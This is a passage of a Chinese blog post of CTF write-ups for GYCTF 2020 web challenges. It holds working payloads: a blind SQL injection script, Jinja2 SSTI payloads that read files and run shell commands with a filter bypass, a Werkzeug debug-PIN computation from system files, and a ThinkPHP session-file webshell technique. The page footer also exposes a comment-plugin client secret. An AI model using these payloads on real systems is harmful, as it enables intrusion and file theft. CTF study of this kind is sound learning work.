+<pre class="line-numbers language-html"><code class="language-html">import requests
+
+def get_data(payload):
+    url = 'http://28d6e66d289a4373a38b155e9236e53aeb8630a0dd34426a.changame.ichunqiu.com/'
+    data = {
+            'id':payload
+            }
+    req = requests.post(url,data=data) 
+    data = req.text
+    return data
+res = ''
+for i in range(1,50):
+    for j in range(32,127):
+        a1 = str(hex(j)).replace('0x','')
+        a2 = ''
+        for k in res:
+            a2 += str(hex(ord(k))).replace('0x','')
+        # f1ag_1s_h3r3_hhhhh
+        payload = "id=1|| (( select 1,0x{} )> (select * from (f1ag_1s_h3r3_hhhhh)))".format(a2+a1)
+        # print(payload)
+        data = get_data(payload)
+        if 'Nu1L' in data:
+            res += chr(j-1)
+            print(res)
+            if j==32:
+                print(res.lower())
+                exit()
+            break
+print(res.lower())
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="blacklist"><a href="#blacklist" class="headerlink" title="blacklist"></a>blacklist</h3><p>原题，复旦大学校赛的时候出过。<br>paylaod <code>1&#39;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;</code></p>
+<h2 id="DAY3"><a href="#DAY3" class="headerlink" title="DAY3"></a>DAY3</h2><h3 id="Flaskapp"><a href="#Flaskapp" class="headerlink" title="Flaskapp"></a>Flaskapp</h3><p><strong>知识点：SSTI+Flask PIN</strong><br>知识点文章：<a href="https://xz.aliyun.com/t/2553" target="_blank" rel="noopener">Flask debug pin安全问题</a><br>本题主要有两个功能模块，base64加密和解密模块，首先，我们想到base64解密的时候，如果输入的字符不是正常的密文，一定是会报错的。所以我们传入错误字符。<br>成功出现报错信息，发现出现了debug模式。<br>通过这个pin码，我们可以在报错页面执行任意python代码。<br><img src="https://s2.ax1x.com/2020/02/24/38Rqz9.png" alt="38Rqz9.png"><br>我们需要一个PIN码才能进入。<br>我们都PIN并不安全，如果可以得到一些信息，就可以手工算出来。<br>然后发现解密处存在ssti任意文件读取漏洞。<br>payload：</p>
+<pre class="line-numbers language-html"><code class="language-html">{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('想要读取的文件', 'r').read() }}{% endif %}{% endfor %}
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>将payload进行base64编码后传入。<br>我们需要读：</p>
+<pre class="line-numbers language-python"><code class="language-python">获取machine<span class="token operator">-</span>id
+<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>cgroup真实环境读取<span class="token operator">/</span>etc<span class="token operator">/</span>machine<span class="token operator">-</span>id
+
+获取mac地址
+<span class="token operator">/</span>sys<span class="token operator">/</span><span class="token keyword">class</span><span class="token operator">/</span>net<span class="token operator">/</span>eth0<span class="token operator">/</span>address
+读到<span class="token number">02</span><span class="token punctuation">:</span><span class="token number">42</span><span class="token punctuation">:</span>ac<span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">08</span>转十进制<span class="token number">2485377957896</span>
+
+利用报错获取路径
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>lib<span class="token operator">/</span>python3<span class="token number">.7</span><span class="token operator">/</span>site<span class="token operator">-</span>packages<span class="token operator">/</span>flask<span class="token operator">/</span>app<span class="token punctuation">.</span>py
+
+用户名
+<span class="token operator">/</span>etc<span class="token operator">/</span>passwd
+获取：flaskweb<span class="token punctuation">:</span>x<span class="token punctuation">:</span><span class="token number">1000</span><span class="token punctuation">:</span><span class="token number">1000</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">/</span>home<span class="token operator">/</span>flaskweb<span class="token punctuation">:</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>注意在docker环境中不要读/etc/machine-id，不然算出来的PIN不对<br>根据上面的信息构造payload：</p>
+<pre class="line-numbers language-html"><code class="language-html">import hashlib
+from itertools import chain
+probably_public_bits = [
+    'flaskweb',# username
+    'flask.app',# modname
+    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
+    '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),
+]
+
+private_bits = [
+    '2485377957896',# str(uuid.getnode()),  /sys/class/net/ens33/address
+    'e96996169e90130c1b6e2b3fb9af5b39abcacc1b1f84211a58e27854c3a1219e'# get_machine_id(), /etc/machine-id
+]
+
+h = hashlib.md5()
+for bit in chain(probably_public_bits, private_bits):
+    if not bit:
+        continue
+    if isinstance(bit, str):
+        bit = bit.encode('utf-8')
+    h.update(bit)
+h.update(b'cookiesalt')
+
+cookie_name = '__wzd' + h.hexdigest()[:20]
+
+num = None
+if num is None:
+    h.update(b'pinsalt')
+    num = ('%09d' % int(h.hexdigest(), 16))[:9]
+
+rv =None
+if rv is None:
+    for group_size in 5, 4, 3:
+        if len(num) % group_size == 0:
+            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
+                          for x in range(0, len(num), group_size))
+            break
+    else:
+        rv = num
+
+print(rv)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>成功获取pin码193-425-766<br>输入PIN，如果PIN正确则得到一个Python的shell：<br>读flag。</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> os
+os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
+open<span class="token punctuation">(</span><span class="token string">'this_is_the_flag.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://s2.ax1x.com/2020/02/24/38o1lF.png" alt="38o1lF.png"><br>这个题还可以直接用ssti执行命令：</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">127</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'po'</span><span class="token operator">+</span><span class="token string">'pen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>flag被过滤使用<code>fla\g</code>绕过：</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">127</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'po'</span><span class="token operator">+</span><span class="token string">'pen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'cat  this_is_the_fla\g.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="easy-thinking"><a href="#easy-thinking" class="headerlink" title="easy_thinking"></a>easy_thinking</h3><p><strong>知识点：thinkphp6.0任意文件操作和bypass disfunction</strong><br>知识分析：<a href="https://xz.aliyun.com/t/7131" target="_blank" rel="noopener">ThinkPHP6.0 任意文件操作</a><br>存在<a href="http://www.zip" target="_blank" rel="noopener">www.zip</a><br>随便输入一个路径，测试发现thinkphp版本为6.0，搜索存在任意文件操作漏洞。<br>于是，开始复现：<br>先注册一个账号，然后在登录时候burp抓包，修改session，注意长度必须是32位，将session改成<code>.php</code>结尾。<br><img src="https://s2.ax1x.com/2020/02/24/38wyZj.png" alt="38wyZj.png"><br>然后在搜索处输入的东西都会保存下来。默认的历史都保存在<code>/runtime/session/</code>目录内。所以在搜索中写入马。<br>然后在<code>/runtime/session/</code>+你构造的sessionid就可以访问到。<br>然后，查看phpinfo()存在禁用函数：</p>
+<pre class="line-numbers language-html"><code class="language-html">passthru,mail,error_log,mb_send_mail,imap_mail,exec,system,chroot,chgrp,chown,shell_exec,popen,proc_open,pcntl_exec,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,imap_open,apache_setenv
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>然后在根目录存在readflag，所以只需要bypass执行命令就可以了。<br>常用的几种方法都不行。<br>这里直接用脚本：<a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">https://github.com/mm0r1/exploits</a><br>执行/readflag即可。</p>
+<h3 id="ezExpress"><a href="#ezExpress" class="headerlink" title="ezExpress"></a>ezExpress</h3><p>听说是原题。不会。。。</p>
+<h3 id="Node-Game"><a href="#Node-Game" class="headerlink" title="Node Game"></a>Node Game</h3><p>官方这个题的writeup：<a href="http://blog.5am3.com/2020/02/11/ctf-node1/" target="_blank" rel="noopener">http://blog.5am3.com/2020/02/11/ctf-node1/</a><br>我不会。。。</p>
+<p>因为不会node.js所以就不会。这两个题有时间了再研究一下。这两个题的writeup：<a href="https://www.zhaoj.in/read-6462.html" target="_blank" rel="noopener">i春秋2020新春战“疫”网络安全公益赛GYCTF 两个 NodeJS 题 WriteUp</a></p>
+	
+	</div>
+	
+	<div id="current-post-cover" data-scr="/images/post-cover/6.jpg"></div>
+
+	<!-- relate post, comment...-->
+	<div class="investment-container">
+		<div class="investment-header">
+			<div class="investment-title-1">
+				<div class="on">相关文章</div>
+				<div>评论</div>
+			</div>
+			<div class="investment-title-2">	            
+				
+	<span>
+		<a href="javascript: window.scrollTo(0, 0);">返回顶部</a>
+		
+			<a href="/2020/02/27/linux三剑客/" title="linux三剑客" rel="prev">
+				&laquo;上一篇
+			</a>
+		
+		
+			<a href="/2019/12/02/计算机组成原理学习/" title="计算机组成原理学习" rel="next">
+				下一篇&raquo;
+			</a>
+			
+	</span>
+      		
+			</div>	
+		</div>
+		
+		<div class="investment-content">
+			<div class="investment-content-list">
+				
+
+<div class="relate-post">
+	<ul>
+		
+				<li>
+					<div>
+						<a href="/2019/12/01/2019安洵杯-2019广外比赛web部分题解/" title="2019安洵杯+2019广外比赛web部分题解">
+							2019安洵杯+2019广外比赛web部分题解
+						</a>
+						<p>
+							2019安洵杯easy_web知识点：MD5强碰撞，命令执行这个题比较简单，看题目发现传入参数img和cmd，然而图片是传入的img参数控制，让我想到ddctf的一道题，然后发现img是通过把文件名进行转十六进制后两次base64编码...
+						</p>
+					</div>
+
+					<a href="/2019/12/01/2019安洵杯-2019广外比赛web部分题解/" title="2019安洵杯+2019广外比赛web部分题解">				
+						<img src="/images/post-cover/37.jpg" class="relateImg" alt="2019安洵杯+2019广外比赛web部分题解">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/11/20/2019极客大挑战RCE-ME/" title="2019极客大挑战RCE ME">
+							2019极客大挑战RCE ME
+						</a>
+						<p>
+							题目环境：http://114.116.44.23:40001/
+题目还是老样子。无字母数字rce。知识点其实都有写过，就不说了。详细参见：【RCE提高篇】题目源码：
+&lt;?php
+ini_set("display_errors"...
+						</p>
+					</div>
+
+					<a href="/2019/11/20/2019极客大挑战RCE-ME/" title="2019极客大挑战RCE ME">				
+						<img src="/images/post-cover/32.jpg" class="relateImg" alt="2019极客大挑战RCE ME">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/10/16/buuctf刷题记录-序/" title="buuctf刷题记录(序)">
+							buuctf刷题记录(序)
+						</a>
+						<p>
+							love math知识点：代码审计，绕waf直接给出源码：
+&lt;?php
+error_reporting(0);
+//听说你很喜欢数学，不知道你是否爱它胜过爱flag
+if(!isset($_GET['c'])){
+    sho...
+						</p>
+					</div>
+
+					<a href="/2019/10/16/buuctf刷题记录-序/" title="buuctf刷题记录(序)">				
+						<img src="/images/post-cover/33.jpg" class="relateImg" alt="buuctf刷题记录(序)">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/09/07/buuctf刷题记录/" title="buuctf刷题记录">
+							buuctf刷题记录
+						</a>
+						<p>
+							前言最近感觉自己菜出来新境界。。。刷点题来证明我还存在。。。言归正传。开刷
+hack world知识点：sql布尔盲注，bypass进入题目，发现这是典型的sql布尔盲注，题目给出了表名和列名都是flag，用burp进行fuzz测试发...
+						</p>
+					</div>
+
+					<a href="/2019/09/07/buuctf刷题记录/" title="buuctf刷题记录">				
+						<img src="/images/post-cover/31.jpg" class="relateImg" alt="buuctf刷题记录">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/09/04/OGeek-CTF-2019-Enjoy-You-Self/" title="OGeek CTF 2019-Enjoy You Self">
+							OGeek CTF 2019-Enjoy You Self
+						</a>
+						<p>
+							前言最近ctf不少，但是成绩不咋样，菜的真实。新学期开始了，最后一年了。。。继续努力吧。OPPO OGeek CTF 2019咋说呢，菜。。。总结一下学到的东西吧。
+Enjoy You Self线上环境：http://47.107.2...
+						</p>
+					</div>
+
+					<a href="/2019/09/04/OGeek-CTF-2019-Enjoy-You-Self/" title="OGeek CTF 2019-Enjoy You Self">				
+						<img src="/images/post-cover/30.jpg" class="relateImg" alt="OGeek CTF 2019-Enjoy You Self">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/08/06/2018n1ctf-esay-php复现/" title="2018n1ctf-esay-php复现">
+							2018n1ctf-esay-php复现
+						</a>
+						<p>
+							前言最近做题，两次遇见这个题。第一次看着writeup都没复现成功。emm（菜的真实。。。）。这次自己搭的环境用三种方法来复现这个题。
+环境搭建官方给了环境，有dockerfile。所以比较容易搭建的。官方文件在docker上安装上d...
+						</p>
+					</div>
+
+					<a href="/2019/08/06/2018n1ctf-esay-php复现/" title="2018n1ctf-esay-php复现">				
+						<img src="/images/post-cover/29.jpg" class="relateImg" alt="2018n1ctf-esay-php复现">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/06/16/刷题记录/" title="刷题记录">
+							刷题记录
+						</a>
+						<p>
+							一步步慢慢绕题目：
+&lt;?php
+show_source(__FILE__);
+$v1=0;$v2=0;$v3=0;
+$a=(array)json_decode(@$_GET['foo']);
+if(is_array($a)){
+...
+						</p>
+					</div>
+
+					<a href="/2019/06/16/刷题记录/" title="刷题记录">				
+						<img src="/images/post-cover/38.jpg" class="relateImg" alt="刷题记录">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/06/13/sql注入新姿势-2019强网杯/" title="sql注入新姿势-2019强网杯">
+							sql注入新姿势-2019强网杯
+						</a>
+						<p>
+							前言woc前一段时间，写过一次，发现被我搞丢了，气死…重写ing
+随便注首先，对题目进行测试尝试一下1&#39;发现会得到报错，尝试一下万能密码1&#39; or &#39;1&#39;=&#39;1，发现能够把当前表所有的值全部输出...
+						</p>
+					</div>
+
+					<a href="/2019/06/13/sql注入新姿势-2019强网杯/" title="sql注入新姿势-2019强网杯">				
+						<img src="/images/post-cover/30.jpg" class="relateImg" alt="sql注入新姿势-2019强网杯">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/06/05/ciscn线下部分题解/" title="ciscn线下部分题解">
+							ciscn线下部分题解
+						</a>
+						<p>
+							前言ciscn华中赛区线下赛让我认识到自己是真的菜。。。总结一下这次比赛吧。
+web1 &lt;?php
+// ini_set("display_errors", "On"); 
+// error_reporting(E_ALL | ...
+						</p>
+					</div>
+
+					<a href="/2019/06/05/ciscn线下部分题解/" title="ciscn线下部分题解">				
+						<img src="/images/post-cover/36.jpg" class="relateImg" alt="ciscn线下部分题解">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/04/30/2019ddctfwriteup/" title="2019ddctfwriteup">
+							2019ddctfwriteup
+						</a>
+						<p>
+							web滴~这是i春秋上的一个原题。（原题比这个好）进入页面发现观察jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09像是个base64编码。进行解码。解码两次得到666C61672E6A7067。像是个base1...
+						</p>
+					</div>
+
+					<a href="/2019/04/30/2019ddctfwriteup/" title="2019ddctfwriteup">				
+						<img src="/images/post-cover/25.jpg" class="relateImg" alt="2019ddctfwriteup">
+					</a>
+				</li>											
+		
+		
+	</ul>
+</div>	
+			</div>
+			<div class="investment-content-list">
+				<div class="layout-comment">
+
+	
+
+		
+
+			<!-- comment gitalk -->
+			<!-- show gitalk comment -->
+<div id="gitalk-container"></div>
+
+<!-- gitalk`s css & js -->
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<link rel="stylesheet" href="/css/comment.css">
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<script type="text/javascript">
+	//Thanks O-R
+	//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
+	//去除尾部匹配正则数组的字符串  
+	//Remove redundant characters
+	String.prototype.trimEnd = function(regStr) {
+		var result = this;
+		if(regStr == undefined || regStr == null || regStr == "") {
+			return result;
+		}
+		var array = regStr.split(',');
+
+		if(array.length > 0) {
+
+			var c = array.shift();
+			var str = this;
+			var i = str.length;
+			var rg = new RegExp(c);
+			var matchArr = str.match(rg);
+
+			if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
+				var matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
+					.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
+					.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
+					.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
+					.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
+					.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
+					.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
+					.replace(/\./g, "\\.").replace(/\&/g, "\\&");
+				matchStr = matchStr + '$';
+				result = str.replace(new RegExp(matchStr), "");
+			}
+
+			if(array.length > 0) {
+				return result.trimEnd(array.join())
+			} else {
+				return result;
+			}
+		}
+	};
+
+	//Create gitalk
+	var gitalk = new Gitalk({
+		clientID: 'b7a5e9f0853539dc3363',
+		clientSecret: '3cd61bd5dfe5ddffe1c91e4392ca95874aade540',
+		//id: window.location.pathname,
+		//id: decodeURI(window.location.pathname),
+		//id: (window.location.pathname).split("/").pop().substring(0, 49),
+		id: decodeURI( md5( location.href.trimEnd('#.*$,\\?.*$,index.html$') ) ),
+		repo: 'blog-Comment-Repo',
+		owner: 'ab-Alex',
+		admin: 'ab-Alex',
+		distractionFreeMode: 'true',
+	})
+	gitalk.render('gitalk-container');
+</script>
+
+		
+		
+	
+
+</div>
+			</div>
+		</div>	
+	</div>
+</div>
+
+
+
+	<!-- leancloud -->
+	<!--
+	时间：2018-11-27
+	描述：
+		文章访问量：visitors
+		文章喜欢量：likes	
+		文章排行榜：topNPost
+		其他得说明：
+			01-Cookie相关的函数 
+				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
+			02-visitors相关的函数 
+				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
+				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
+			03-topNPost相关的函数
+				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
+			04-likes相关的函数，
+				参考了01 & 02进行简单的设计与实现
+-->
+
+
+
+	<script>
+		var appid = 'dXz',
+            appkey = 'wzG';	  
+        AnnieLeancloud(appid, appkey);         
+	</script>
+    
+
+
+ 
+
+<!-- show math formula -->
+
+	<script type="text/javascript" async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+	<script type="text/x-mathjax-config">
+		MathJax.Hub.Config(
+			{ 
+				tex2jax: {
+					inlineMath: [['$','$'], ['\\(','\\)']]
+				} 
+			}
+		);
+	</script>
+
+
+
+<script>
+	//Refer to https://xinyo.org/archives/66226, thanks xinyo!
+	function codeCopy() {
+		var copyContainerId = 'copy-nav';
+						
+		$("pre").before(" <nav class=' " + copyContainerId + " '><i class='code-language'></i></nav> ");
+		
+		$('.' + copyContainerId).append("<i class='fa fa-clipboard copy-btn' aria-hidden='true'></i>");
+		
+		$('#article-content').find('pre').each( function () {
+			var language = $(this).children('code').attr('class').substr(9);//why 9? Need to check language?
+			$(this).prev().find('.code-language').text( language );	
+		});
+				
+		//为复制按钮添加click事件
+		$('.copy-btn').on("click", function() {
+			//初始化
+			$("textarea").remove("#targetId");
+			
+			//获取对应的代码
+			var codePre = $(this).parent().next(),
+				codeText = codePre[0].textContent,
+				target = document.createElement("textarea");
+			target.style.position = "absolute";
+			target.style.left = "-9999px";
+			target.style.top = "0";
+			target.id = "targetId";
+			codePre.append(target);
+			target.textContent = codeText;
+
+			//选中textarea内的代码
+			target.focus();
+			target.setSelectionRange(0, target.value.length);
+
+			// 复制选中的内容
+			document.execCommand("copy");
+			
+			//删除添加的节点
+			$("textarea").remove("#targetId");
+			
+			var thisCopied = $(this);
+			thisCopied.addClass('copy-status');	
+			setTimeout( function() {
+				thisCopied.removeClass('copy-status');
+			}, 2000)
+		});	
+	}
+	
+	if( $('.layout-post').length )	{
+		codeCopy();
+	}
+</script>
+
+
+<!-- TODO: There seems to be a bug when you close the post gallery! -->
+<link rel="stylesheet" href="/plugin/lightgallery/css/lightgallery.css">
+<script src="/plugin/lightgallery/js/jquery-1.11.0.min.js"></script>
+<script src="/plugin/lightgallery/js/lightgallery-all.min.js"></script>
+
+<script type="text/javascript">
+	var postTitle = $('.article-title a').text() ? $('.article-title a').text() : "No post title!";
+	$('.article-content img').each(function() {
+		var imgPath = $(this).attr('src'),
+			imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
+		$(this).wrap('<div class="img-responsive" data-src="' + imgPath + '" data-responsive="' + imgPath + '" data-sub-html="<p>图片 ' + imgTitle + '</p><h4>文章' + postTitle + '</h4>"></div>');
+	});
+
+	$('.article-content').lightGallery({
+		mode: 'lg-slide',
+		selector: '.img-responsive',
+		share: false,
+		zoom: false,
+		download: false
+	});
+	//TODO：支持video
+</script>
+
+<!--
+	时间：2018-11-17
+	描述：
+		插件名称：katelog.min.js
+		插件作者：KELEN
+		插件来源: https://github.com/KELEN/katelog
+-->
+
+		
+
+		<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
+		<script src="/plugin/toc/katelog.min.js"></script>
+
+		
+	
+		</main>
+		
+		<!--footer-->
+		<footer>
+	<div class="social">
+		<ul>
+	
+		
+			<li>
+				<a href="http://github.com/" title="Github" target="_blank">
+					<i class="fa fa-github"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="http://github.com/" title="Weibo" target="_blank">
+					<i class="fa fa-weibo"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="mailto:http://github.com/" title="Email" target="_blank">
+					<i class="fa fa-envelope-o"></i>
+				</a>
+			</li>
+		
+
+		
+			<li>
+				<a href="http://github.com/" title="QQ" target="_blank">
+					<i class="fa fa-qq"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="http://github.com/" title="Twitter" target="_blank">
+					<i class="fa fa-twitter"></i>
+				</a>
+			</li>
+		
+	 
+</ul>
+	</div>
+		
+	<div class="copyright">
+		<p>
+			 
+				&copy;2017 - 2020, content by Alex. All Rights Reserved.
+			
+			
+			
+
+	<!-- busuanzi -->
+	<!-- busuanzi -->
+
+		
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	
+
+		<span id="busuanzi_container_page_pv">
+	  		本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+		</span>
+
+	
+
+
+
+
+		</p>
+		<p>
+			<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay. 					
+		</p>
+	</div>		
+</footer>
+		
+    <!-- set '1' to show motto in all pages! -->
+
+	<script src="/js/motto.js"></script>
+	<script type="text/javascript">
+		$(".motto").html( getMingYanContent() );
+	</script>	
+
+
+
+
+    <!--
+	时间：2018-10-3
+	描述：
+		插件名称：hexo-generator-search-zip
+		插件来源: https://github.com/SuperKieran/hexo-generator-search-zip
+		代码参考：https://github.com/SuperKieran/TKL/blob/master/layout/_partial/search.ejs(Include: js & css)	
+-->
+<div class="popup search-popup local-search-popup">
+	<div class="local-search-container">
+		<span class="popup-btn-close">
+      ESC
+   </span>
+		<div class="local-search-header">
+			<input autocomplete="off" placeholder="Search..." type="text" id="local-search-input">
+		</div>
+		<div class="local-search-body">
+			<div id="local-search-output"></div>
+		</div>
+		<div class="local-search-footer">
+			
+
+   
+	<div id="topN"></div>
+	
+    <script>
+        var appid = 'dXz',
+            appkey = 'wzG',
+            limitCount = 10;
+        if( $('#topN').length ){
+            AV.initialize(appid, appkey);
+            var Counter = AV.Object.extend("Counter");  
+            topNPost(Counter, limitCount);
+        }
+    </script>
+   
+
+		</div>
+	</div>
+</div>
+
+<script src="/js/ziploader.js"></script>
+<script src="/js/search.js"></script>
+
+<script type="text/javascript">
+	var search_path = 'search.json',
+		zip_Path = '/search.zip',
+		version_Path = '/searchVersion.txt',
+		input_Trigger = 'auto',
+		top_N = '2';
+
+	themeLocalSearch({
+		search_path, 
+		zip_Path, 
+		version_Path, 
+		input_Trigger, 
+		top_N
+	});
+</script>
+
+
+
+    <script src="/js/love.js"></script>
+
+
+<!--back to top-->
+
+    
+	<div id="totop">
+  		<a href="javascript:;"  name="TOTOP" class="fa fa-arrow-up" ></a>
+	</div>
+	<div id="tobuttom">
+		<a href="javascript:;"  name="TOBUTTOM" class="fa fa-arrow-down" ></a>
+	</div>
+ 
+
+
+ 
+
+<script src="/js/vibrant.js"></script>
+<script src="/js/chinese.js"></script>
+<script src="/js/main.js"></script>
+	</body>
+	</html>
